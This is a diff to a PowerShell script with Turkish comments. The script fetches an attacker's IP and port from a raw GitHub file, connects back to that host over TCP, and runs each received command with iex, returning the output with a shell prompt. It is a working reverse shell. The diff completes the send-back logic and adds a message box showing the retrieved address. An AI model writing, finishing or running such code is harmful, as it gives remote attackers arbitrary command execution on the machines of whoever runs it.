@@ -5,13 +5,15 @@ $url = "https://raw.githubusercontent.com/jmfjlkelmf/oerb/main/rotg"
 $response = Invoke-WebRequest -Uri $url
 
 # İçerikten IP ve portu ayır
-# Örneğin, içerik "192.168.1.2:55" gibi bir string döndürüyor olsun.
 $content = $response.Content.Trim()
 $parts = $content -split ':'
 $server = $parts[0]
 $port = [int]$parts[1]
 
-# TCP Client'i IP ve Port ile başlat
+# IP adresi ve portu kontrol etmek için bir mesaj kutusu göster
+[System.Windows.Forms.MessageBox]::Show("IP Adresi: $server`nPort: $port", "IP ve Port Bilgisi")
+
+# Devamında TCP Client'i IP ve Port ile başlatmak gibi işlemleri yapabilirsiniz
 $client = New-Object System.Net.Sockets.TCPClient($server, $port)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
@@ -26,4 +28,8 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $sendback = (iex ". { $data } 2>&1" | Out-String)
     $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
     $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte, 
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+
+$client.Close()
